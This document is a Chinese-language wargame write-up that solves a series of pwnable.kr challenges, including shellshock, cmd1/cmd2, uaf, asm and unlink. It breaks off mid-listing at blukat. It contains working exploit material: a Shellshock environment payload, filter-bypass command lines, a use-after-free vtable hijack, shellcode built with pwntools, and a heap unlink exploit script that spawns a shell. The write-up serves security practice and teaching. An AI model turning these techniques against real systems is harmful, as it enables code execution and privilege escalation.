&lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3... 可以看到这里进行了bl 0x8d20来调用key3函数，指令位于0x00008d7c，那么此时返回地址应该是它的下一条指令所在地址，也就是0x00008d80。 至此我们已经拿到了 3 个 key，相加得到108400，输入即可。 精简指令集的确精简。 mistake1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len){ int i; for(i=0; i&lt;len; i++){ s[i] ^= XORKEY; }}int main(int argc, char* argv[]){ int fd; if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0){ printf(&quot;can't open password %d\\n&quot;, fd); return 0; } printf(&quot;do not bruteforce...\\n&quot;); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ printf(&quot;read error\\n&quot;); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(&quot;input password : &quot;); scanf(&quot;%10s&quot;, pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(&quot;Password OK\\n&quot;); system(&quot;/bin/cat flag\\n&quot;); } else{ printf(&quot;Wrong Password\\n&quot;); } close(fd); return 0;} 注意到XORKEY为 1，也就是说xor函数只是把字符串的每个字符最低位翻转了一下。此外我们还知道输入的密码和文件中密码都是 10 字节，但我们读取不了后者。 回到题目提示，说和运算符优先级有关，回代码里看看也只有fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0可能出问题了，这里会先进行小于号比较，再将结果，一个布尔值，赋值给fd。如果文件正常打开，那么fd应该为false也就是0，这就是标准输入流的 fd，换句话说这个 pw_buf 的内容也是我们可以控制的。 之后就容易了，标准输入里输入十个b，然后提示input password:时输入十个c使得异或结果正确即可。 shellshock1234567#include &lt;stdio.h&gt;int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(&quot;/home/shellshock/bash -c 'echo shock_me'&quot;); return 0;} 我们需要结合ls -al的结果来分析代码： 123456789drwxr-x--- 5 root shellshock 4096 Oct 23 2016 .drwxr-xr-x 114 root root 4096 May 19 15:59 ..-r-xr-xr-x 1 root shellshock 959120 Oct 12 2014 bashd--------- 2 root root 4096 Oct 12 2014 .bash_history-r--r----- 1 root shellshock_pwn 47 Oct 12 2014 flagdr-xr-xr-x 2 root root 4096 Oct 12 2014 .irssidrwxr-xr-x 2 root root 4096 Oct 23 2016 .pwntools-cache-r-xr-sr-x 1 root shellshock_pwn 8547 Oct 12 2014 shellshock-r--r--r-- 1 root root 188 Oct 12 2014 shellshock.c 可以看到我们对flag文件没有任何权限，但是shellshock_pwn组的用户可以读flag。回到代码中，将uid和gid设成egid后，程序已经拥有了shellshock_pwn组的权限，可以读到flag了，只是并没有读flag的代码。 联系题目提示，我们可以利用 bash 的ShellShock 漏洞，具体原理可以参考链接中的文章。输入 payload： 12$ export foo='() { :; }; /bin/cat flag'$ ./shellshock coin1找假币问题，在 N 个硬币中最多花 C 次来找到唯一的一个较轻的假币，需要在 30 秒内完成 100 次游戏。最经典的解法就是二分，每次称一半，如果重量不是 10 的倍数则其中必定有假币，否则假币在另一半中，这样最多需要log(2, n)次就能找出假币。需要注意的是，由于网络延迟的关系，最好是在 pwnable.kr 的机器上运行脚本。 123456789101112131415161718192021222324252627from pwn import *import rep = remote('localhost', 9007)ret = p.recv()sleep(3)for i in range(100): ret = p.recv() N = ret[ret.find(&quot;N=&quot;)+2:ret.find(&quot; &quot;)] C = ret[ret.find(&quot;C=&quot;)+2:ret.find(&quot;\\n&quot;)] low = 0 high = int(N) for j in range(int(C)): cnt = (high-low) / 2 mid = low + cnt query = ' '.join([str(i) for i in range(low, mid)]) p.sendline(query) ret = p.recv() if int(ret) % 10 == 0: low = mid else: high = mid p.sendline(str(low)) print p.recv()print p.recv() blackjack这题要求玩 21 点玩到拥有$1,000,000，显然不能通过常规方法达成。我们查看题目给的源码，发现下注时使用的变量bet是一个int类型的数。 随后，betting函数是这样的： 1234567891011121314int betting() //Asks user amount to bet{ printf(&quot;\\n\\nEnter Bet: $&quot;); scanf(&quot;%d&quot;, &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has { printf(&quot;\\nYou cannot bet more money than you have.&quot;); printf(&quot;\\nEnter Bet: &quot;); scanf(&quot;%d&quot;, &amp;bet); return bet; } else return bet;} // End Function 这里程序检查了下的注是否大于拥有的现金数，但并没有检查是否为负数。而当我们输掉一盘后： 123456789if(player_total&lt;dealer_total) //If player's total is less than dealer's total, loss{ printf(&quot;\\nDealer Has the Better Hand. You Lose.\\n&quot;); loss = loss+1; cash = cash - bet; printf(&quot;\\nYou have %d Wins and %d Losses. Awesome!\\n&quot;, won, loss); dealer_total=0; askover();} 可以看到这里有一个cash = cash - bet的语句，当我们输入的bet是负数时，我们就可以让钱不减反增。也就是说，我们只需要下注-1000000，然后故意输掉即可。 lotto123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play(){ int i; printf(&quot;Submit your 6 lotto bytes : &quot;); fflush(stdout); int r; r = read(0, submit, 6); printf(&quot;Lotto Start!\\n&quot;); //sleep(1); // generate lotto numbers int fd = open(&quot;/dev/urandom&quot;, O_RDONLY); if(fd==-1){ printf(&quot;error. tell admin\\n&quot;); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(&quot;error2. tell admin\\n&quot;); exit(-1); } for(i=0; i&lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;bad luck...\\n&quot;); }}void help(){ printf(&quot;- nLotto Rule -\\n&quot;); printf(&quot;nlotto is consisted with 6 random natural numbers less than 46\\n&quot;); printf(&quot;your goal is to match lotto numbers as many as you can\\n&quot;); printf(&quot;if you win lottery for *1st place*, you will get reward\\n&quot;); printf(&quot;for more details, follow the link below\\n&quot;); printf(&quot;http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n&quot;); printf(&quot;mathematical chance to win this game is known to be 1/8145060.\\n&quot;);}int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(&quot;- Select Menu -\\n&quot;); printf(&quot;1. Play Lotto\\n&quot;); printf(&quot;2. Help\\n&quot;); printf(&quot;3. Exit\\n&quot;); scanf(&quot;%d&quot;, &amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(&quot;bye\\n&quot;); return 0; default: printf(&quot;invalid menu\\n&quot;); break; } } return 0;} 很简单的彩票程序，利用伪随机数生成 6 个1 - 45之间的彩票号码，然后跟输入比对，如果全中则显示 flag。这个程序如此简单以至于其中的一个细节很容易被忽略： 123456789// calculate lotto scoreint match = 0, j = 0;for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } }} 这是比对彩票号码的代码，初看之下没什么问题，但是如果让我们自己来写，正常的写法肯定是： 12345for (i = 0; i &lt; 6; i++) { if (lotto[i] == submit[i]) { match++; }} 但这里却用了两层循环，并不是像我们想的那样比较对应位，而是从lotto和submit中各自任取一位，进行共 36 次比较。而对match的要求是 6，也就是说 36 次比较中有 6 次正确即可。 为了让成功的机率最大，我们可以输入 6 个相同的数字x，只要在lotto中有一个号码等于x，那么我们就成功了，这个概率还是比较大的。 需要注意的是输入的字节范围是从\\x01到\\x45（-），而不是数字1-45。 cmd112345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;flag&quot;)!=0; r += strstr(cmd, &quot;sh&quot;)!=0; r += strstr(cmd, &quot;tmp&quot;)!=0; return r;}int main(int argc, char* argv[], char** envp){ putenv(&quot;PATH=/thankyouverymuch&quot;); if(filter(argv[1])) return 0; system( argv[1] ); return 0;} 需要一个命令行参数，但参数中不能包含flag，sh和tmp，这个我们可以利用通配符绕过。注意到环境变量PATH被覆盖，因此我们调用命令时需要使用绝对路径。 1$ ./cmd1 &quot;/bin/cat /home/cmd1/fla*&quot; cmd212345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){ int r=0; r += strstr(cmd, &quot;=&quot;)!=0; r += strstr(cmd, &quot;PATH&quot;)!=0; r += strstr(cmd, &quot;export&quot;)!=0; r += strstr(cmd, &quot;/&quot;)!=0; r += strstr(cmd, &quot;`&quot;)!=0; r += strstr(cmd, &quot;flag&quot;)!=0; return r;}extern char** environ;void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));}int main(int argc, char* argv[], char** envp){ delete_env(); putenv(&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;); if(filter(argv[1])) return 0; printf(&quot;%s\\n&quot;, argv[1]); system( argv[1] ); return 0;} 这次删除了所有环境变量并覆盖了PATH，同时增强了对命令行参数的过滤，关键在于/被过滤了，不能直接写路径。 那么我们就需要执行系统命令来构造出/，很容易想到pwd命令。我们先cd /，此时运行pwd可以看到输出就是/。 仿照 cmd1： 1$ /home/cmd2/cmd2 &quot;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*&quot; 但是这样没有用，猜想是因为$(pwd)先被替换成/了，因为双引号不会忽略$。我们用单引号就可以防止这一替换。 1$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*' uaf12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human{private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); }protected: int age; string name;public: virtual void introduce(){ cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; }};class Man: public Human{public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; }};class Woman: public Human{public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; }};int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0;} 本题最终肯定是要调用Human的give_shell函数，但程序不会直接调用。程序共有三种操作： use: 调用Man和Woman对象的introduce函数 after: 从argv[2]中读取长为argv[1]的数据，放到data中 free: 释放Man和Woman对象的指针 我们这里可以猜想是要将introduce函数劫持到give_shell上，但是具体怎么做？注意到give_shell和introduce都是被继承的虚函数，能不能通过改变函数虚表地址来劫持函数呢？ 首先我们尝试找到Man的虚函数表。在main中找到Man构造函数的地址： 注意到对象被放到rbx里，我们在构造函数执行后下断点，可以查看Man的对象： 1234567(gdb) b *0x400f18(gdb) c(gdb) p/x $rbx$1 = 0x1fe8c50(gdb) x/8 0x1fe8c500x1fe8c50: 0x00401570 0x00000000 0x00000019 0x000000000x1fe8c60: 0x01fe8c38 0x00000000 0x000203a1 0x00000000 由于虚函数表地址在对象首部，所以这里虚函数表地址就是0x401570。我们继续看虚函数表： 12345(gdb) x/8a 0x4015700x401570 &lt;_ZTV3Man+16&gt;: 0x40117a &lt;_ZN5Human10give_shellEv&gt; 0x4012d2 &lt;_ZN3Man9introduceEv&gt;0x401580 &lt;_ZTV5Human&gt;: 0x0 0x4015f0 &lt;_ZTI5Human&gt;0x401590 &lt;_ZTV5Human+16&gt;: 0x40117a &lt;_ZN5Human10give_shellEv&gt; 0x401192 &lt;_ZN5Human9introduceEv&gt;0x4015a0 &lt;_ZTS5Woman&gt;: 0x6e616d6f5735 0x0 用a可以把函数名显示出来，可以看到Man和Human的give_shell虚函数地址相同，而introduce不同，这是符合 C++虚函数机制的：私有虚函数不能被继承，但是会在子类的虚函数表中出现。换句话说，子类调用的本质上还是父类的虚函数。 接下来用 IDA 分析，可以看到输入1的时候执行： 也就是两个introduce，那么这里的v12和v13就可以确定是对应于m和w的虚指针了，之后转换为指针再+8，正好就是调用vtable + 8处的函数即introduce。那么如果我们想让它执行位于vtable + 0的give_shell，只需要在这句执行前让vtable的值减少 8 就行了。 而我们前面已经读到了vtable的值0x401570，减 8 就是0x401568。 说了这么多，怎么利用use、after和free三个过程来修改vtable值呢？我们知道，对于一块free操作释放掉的内存，仍然可能存在一个指针是指向它的，这个指针一般被称作悬空指针dangling pointer。在这里，m和w就属于悬空指针。 如果在这时，我们调用after过程，即分配一个等长的内存区域给data，那么w所指的内存区域就会被分配。如果再次after，那么m所指的内存区域也会被分配，这是由new/malloc的性质决定的。 现在，假如我们给data写入的是0x401568，并且调用use过程，那么就会执行m-&gt;introduce()，这会访问到0x401568 + 8 = 0x401570处的函数指针，恰好是m的vtable + 0处，也就变成了m-&gt;give_shell()。 那么只剩下一个问题了，就是我们要分配多大的空间给data，这在 IDA 中很容易发现： 0x18字节，也就是 24 字节。最终 payload（注意地址是三十二位的）： 1234567891011121314151617181920$ python -c 'print &quot;\\x68\\x15\\x40&quot;+&quot;\\x00&quot;*5' &gt; /tmp/payload$ ./uaf 24 /tmp/payload1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1 memcpy123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc(){ asm(&quot;rdtsc&quot;);}char* slow_memcpy(char* dest, const char* src, size_t len){ int i; for (i=0; i&lt;len; i++) { dest[i] = src[i]; } return dest;}char* fast_memcpy(char* dest, const char* src, size_t len){ size_t i; // 64-byte block fast copy if(len &gt;= 64){ i = len / 64; len &amp;= (64-1); while(i-- &gt; 0){ __asm__ __volatile__ ( &quot;movdqa (%0), %%xmm0\\n&quot; &quot;movdqa 16(%0), %%xmm1\\n&quot; &quot;movdqa 32(%0), %%xmm2\\n&quot; &quot;movdqa 48(%0), %%xmm3\\n&quot; &quot;movntps %%xmm0, (%1)\\n&quot; &quot;movntps %%xmm1, 16(%1)\\n&quot; &quot;movntps %%xmm2, 32(%1)\\n&quot; &quot;movntps %%xmm3, 48(%1)\\n&quot; ::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;); dest += 64; src += 64; } } // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;}int main(void){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Hey, I have a boring assignment for CS class.. :(\\n&quot;); printf(&quot;The assignment is simple.\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;- What is the best implementation of memcpy? -\\n&quot;); printf(&quot;- 1. implement your own slow/fast version of memcpy -\\n&quot;); printf(&quot;- 2. compare them with various size of data -\\n&quot;); printf(&quot;- 3. conclude your experiment and submit report -\\n&quot;); printf(&quot;-----------------------------------------------------\\n&quot;); printf(&quot;This time, just help me out with my experiment and get flag\\n&quot;); printf(&quot;No fancy hacking, I promise :D\\n&quot;); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++){ // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high); scanf(&quot;%d&quot;, &amp;size); if( size &lt; low || size &gt; high ){ printf(&quot;don't mess with the experiment.\\n&quot;); exit(0); } sizes[i++] = size; } sleep(1); printf(&quot;ok, lets run the experiment with your configuration\\n&quot;); sleep(1); // run experiment for(i=0; i&lt;10; i++){ size = sizes[i]; printf(&quot;experiment %d : memcpy with buffer size %d\\n&quot;, i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\\n&quot;, t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\\n&quot;, t2-t1); printf(&quot;\\n&quot;); } printf(&quot;thanks for helping my experiment!\\n&quot;); printf(&quot;flag : ----- erased in this source code -----\\n&quot;); return 0;} 本题实现了一个针对 64 字节以上的块的快速memcpy方法，使用的是movdqa和movntps两个汇编指令。但是实际运行时，即使按要求输入合法数据，程序也会崩溃。查了一些资料后，发现是由于堆分配时字节没有对齐导致的： The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated. 显然这里是要求目的地址是 16 字节对齐的，换句话说它的十六进制末尾是 0。gdb 调试一下，全部输入最小的合法数据： 可以看到段错误的时候，目的寄存器edx的末尾并不是 0，因此产生了错误。这不难理解：malloc进行堆分配时，对于8而言分配了0x8+0x8=0x10字节，是对齐的；对16而言分配了0x8+0x10=0x18字节，于是不对齐了，我们可以给它+8 来对齐。对于32，分配0x8+0x20=0x28字节，同样不对齐，我们也作同样的 padding 处理，于是我们可以输入数据： 18 24 40 72 136 264 520 1032 2056 4104 使得每次edx都是对齐的，程序就不会段错误了，最终得到 flag。 asm12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox(){ scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) { printf(&quot;seccomp error\\n&quot;); exit(0); } seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0){ seccomp_release(ctx); printf(&quot;seccomp error\\n&quot;); exit(0); } seccomp_release(ctx);}char stub[] = &quot;\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff&quot;;unsigned char filter[256];int main(int argc, char* argv[]){ setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf(&quot;Welcome to shellcoding practice challenge.\\n&quot;); printf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n&quot;); printf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n&quot;); printf(&quot;If this does not challenge you. you should play 'asg' challenge :)\\n&quot;); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf(&quot;give me your x64 shellcode: &quot;); read(0, sh+offset, 1000); alarm(10); chroot(&quot;/home/asm_pwn&quot;); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;} 程序通过sandbox函数和chroot禁止我们使用符号链接和除了open, read, write之外的函数，同时题目给出了一个readme： 12once you connect to port 9026, the &quot;asm&quot; binary will be executed under asm_pwn privilege.make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory) flag 的文件名是一个已知的非常长的字符串。 根据提示，我们知道我们需要写一段shellcode，并通过最后的((void (*)(void))sh)();执行。在执行前，程序还会执行一段汇编代码，也就是这里的stub数组中的内容，利用pwntools的disasm工具得到汇编代码： 123456789101112131415161718192021222324252627282930 0: 48 dec eax 1: 31 c0 xor eax,eax 3: 48 dec eax 4: 31 db xor ebx,ebx 6: 48 dec eax 7: 31 c9 xor ecx,ecx 9: 48 dec eax a: 31 d2 xor edx,edx c: 48 dec eax d: 31 f6 xor esi,esi f: 48 dec eax10: 31 ff xor edi,edi12: 48 dec eax13: 31 ed xor ebp,ebp15: 4d dec ebp16: 31 c0 xor eax,eax18: 4d dec ebp19: 31 c9 xor ecx,ecx1b: 4d dec ebp1c: 31 d2 xor edx,edx1e: 4d dec ebp1f: 31 db xor ebx,ebx21: 4d dec ebp22: 31 e4 xor esp,esp24: 4d dec ebp25: 31 ed xor ebp,ebp27: 4d dec ebp28: 31 f6 xor esi,esi2a: 4d dec ebp2b: 31 ff xor edi,edi 这里把所有寄存器都清零了，这样实际上更方便我们写shellcode。 考虑如何用系统调用读取文件并显示出来： 123fd = open(filepath, O_RDONLY);read(fd, buf, 100);write(1, buf, 100); // stdout 然后我们利用pwntools的shellcraft模块，将上面的代码转化成汇编即可。我们要取得fd也就是open的返回值，显然在rax里；然后从rax中读取 flag 内容，放到栈上，也就是rsp上： 123456789101112131415from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = remote('pwnable.kr', 9026)shellcode = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0)shellcode += shellcraft.read('rax', 'rsp', 100)shellcode += shellcraft.write(1, 'rsp', 100)p.recvuntil('shellcode: ')p.sendline(asm(shellcode))p.interactive() unlink12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ{ struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];}OBJ;void shell(){ system(&quot;/bin/sh&quot;);}void unlink(OBJ* P){ OBJ* BK; OBJ* FD; BK=P-&gt;bk; FD=P-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD;}int main(int argc, char* argv[]){ malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf(&quot;here is stack address leak: %p\\n&quot;, &amp;A); printf(&quot;here is heap address leak: %p\\n&quot;, A); printf(&quot;now that you have leaks, get shell!\\n&quot;); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;} 题目提供了指针 A 在栈上的地址和其所指对象在堆上的地址，随后出现了一个堆溢出漏洞，显然是要我们溢出 A 的 buf 去覆盖 B 的内容，然后unlink(B)。 unlink函数的原理和双向链表中删除结点是一样的，不规范地缩写一下： 12[P-&gt;fd]-&gt;bk = P-&gt;bk[P-&gt;bk]-&gt;fd = P-&gt;fd 然而，尽管P-&gt;fd-&gt;bk和P-&gt;bk-&gt;fd会被检查合法性，这两句赋值语句中的P-&gt;fd和P-&gt;bk都不会被检查，换句话说我们可以用这个特性使右边的地址覆盖掉左边地址。 再简单一点，注意到-&gt;fd等于+0x0，-&gt;bk等于+0x4，也就是： 12[P]+0x4 = P+0x4[P+0x4] = P 例如，我们可以修改 main 返回地址：ret_addr = shell_addr，也就是令P-&gt;fd=ebp, P-&gt;bk=shell_addr（注意到[P-&gt;fd]-&gt;bk=ebp+4）。然而，当执行下一句时，有[P-&gt;bk]-&gt;fd=*(shell_addr)=shell()，会被P-&gt;fd也就是ebp覆盖掉，导致我们的shell()函数被修改。反之同理。 或者，我们可以往栈上写shell()或者 GOT 劫持，由于NX保护和库函数缺失，这里也不能用。 最后，我们先找到了shell()地址0x80484eb，随后在汇编中发现关键代码： 1234mov ecx, [ebp-0x4]leavelea esp, [ecx-0x4]retn 这里的代码逻辑很奇怪：leave已经恢复esp了，下一句又改变了esp的值。换个写法： 123ecx = [ebp-0x4]esp = ecx-0x4eip = esp 这样就很清晰了，我们可以通过影响esp来影响返回地址，这就需要我们控制ecx。控制ecx，也就是控制[ebp-0x4]。 那我们最终肯定是要让esp = shell_addr，为了产生这个shell_addr，首先要把shell()写入堆上的某个安全（不会被修改）的地方，显然A-&gt;buf开头是非常理想的位置。 此时有shell_addr = A+0x8（两个指针 8 字节），那就要让esp = ecx-0x4 = A+0x8，得ecx = A+0xc。 这需要[ebp-0x4] = A+0xc，这就到了unlink出场的时候了。我们设置B-&gt;bk为ebp-0x4，B-&gt;fd为A+0xc，按照前面说的原理就能实现覆盖（注：此时A-&gt;buf[4:8]被修改，这不会有影响），此时堆长这样（每块 4 字节）： 123456789101112131415 ---------| A-&gt;fd | ---------| A-&gt;bk | ---------| shell() | // A-&gt;buf[0:4] ---------| | // A-&gt;buf[4:8] ---------| A+0xc | // B-&gt;fd ---------| ebp-0x4 | // B-&gt;bk ---------| B-&gt;buf | ... 问题来了： 上面的A是 A 的栈地址还是 A 所指对象的堆地址？ 如何得到ebp-0x4？ 第一个问题很容易，我们最终需要获取的内容是shell()，这个东西被我们放在了 A 所指的 OBJ 对象里，所以我们去拿A+0x8很明显是指 A 的堆地址，也就是heap address leak。 第二个问题，题目给的stack_leak我们似乎还没有用，怎么用呢？因为我们需要用 A 在栈上的地址找到ebp-0x4的值，所以计算一下两者的偏移量即可。在汇编代码中可以找到 A,B,C 分别位于ebp-0x14, ebp-0xc, ebp-0x10的位置，那就可以推出ebp-0x4 = (ebp-0x14) + 0x10 = stack address leak + 0x10。 最终 payload： 123456789101112131415from pwn import *p = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest').process('./unlink')p.recvuntil('stack address leak: ')stack_leak = int(p.recv(10), 16)p.recvuntil('heap address leak: ')heap_leak = int(p.recv(9), 16)shell_addr = 0x80484ebpayload = p32(shell_addr) + 'a'*12 + p32(heap_leak+0xc) + p32(stack_leak+0x10)p.send(payload)p.interactive() 此外，我们刚才仅仅利用了第二句话[P-&gt;bk]-&gt;fd = P-&gt;fd，另一句话并没有用。那能不能只用另一句话[P-&gt;fd]-&gt;bk = P-&gt;bk来完成这题呢？当然是可以的。实际上，区别很微妙。 这里不同于刚才控制[ebp-0x4]修改ecx的思路，而是直接想办法修改ebp引起ecx变化，目标还是让[ebp-0x4]=A+0xc。 令P-&gt;fd = ebp-0x8，P-&gt;bk = A+0xc，则我们会发现[P-&gt;fd]-&gt;bk指向ecx，此时我们又能用A+0xc覆盖ecx了！ 12345 ---------| ebp-0x8 | // B-&gt;fd ---------| A+0xc | // B-&gt;bk --------- 根据刚才得到的栈上关系，ebp-0x8 = stack address leak + 0xc，因此第二种方法的 payload： 1payload = p32(shell_addr) + 'a'*12 + p32(stack_leak+0xc) + p32(heap_leak+0xc) blukat这题只有三分，但是代码中并没有什么可利用的点： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = 